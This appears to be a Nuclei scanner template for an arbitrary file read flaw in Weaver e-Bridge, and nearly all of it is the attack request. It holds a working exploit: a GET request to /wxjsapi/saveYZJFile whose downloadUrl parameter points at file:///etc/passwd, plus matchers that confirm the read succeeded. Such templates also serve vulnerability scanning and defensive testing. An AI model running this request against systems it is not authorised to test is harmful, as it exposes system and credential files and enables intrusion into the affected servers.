id: e-Bridge-fileRead
info:
  author: Str1am
  name: "\u6CDB\u5FAE\u4E91\u6865\u4EFB\u610F\u6587\u4EF6\u8BFB\u53D6\u6F0F\u6D1E"
  severity: medium
  tags: e-Bridge
requests:
- matchers:
  - status:
    - 200
    type: status
  - condition: and
    part: body
    type: word
    words:
    - filepath
    - filesize
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/wxjsapi/saveYZJFile?fileName=test&downloadUrl=file:///etc/passwd&fileExt=txt'
